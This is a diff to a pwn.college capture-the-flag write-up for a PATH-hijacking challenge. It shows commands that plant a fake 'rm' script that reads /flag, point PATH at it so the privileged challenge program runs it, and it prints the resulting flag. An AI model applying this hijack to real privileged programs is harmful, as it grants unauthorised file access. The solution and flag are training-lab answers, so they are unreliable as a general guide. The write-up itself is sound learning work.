@@ -93,10 +93,12 @@ hacker@path~adding-commands:~$ ^C
 > **Flag:** `pwn.college{MfJFqx4mLoFVpnnJkxl7kZrLoeU.QX3cjM1wSM5kjNzEzW}`
 
 ```bash
-hacker@path~hijacking-commands:~$ echo #!/bin/bash > /tmp/rm
-hacker@path~hijacking-commands:~$ echo /bin/cat /flag>> /tmp/rm
-hacker@path~hijacking-commands:~$ chmod +x /tmp/rm
-hacker@path~hijacking-commands:~$ PATH=/tmp
+hacker@path~hijacking-commands:~$ which cat
+/run/dojo/bin/cat
+hacker@path~hijacking-commands:~$ echo '#!/bin/bash' > rm
+hacker@path~hijacking-commands:~$ echo '/run/dojo/bin/cat /flag' >> rm
+hacker@path~hijacking-commands:~$ chmod +x rm
+hacker@path~hijacking-commands:~$ PATH=/home/hacker
 hacker@path~hijacking-commands:~$ /challenge/run
 Trying to remove /flag...
 pwn.college{MfJFqx4mLoFVpnnJkxl7kZrLoeU.QX3cjM1wSM5kjNzEzW}
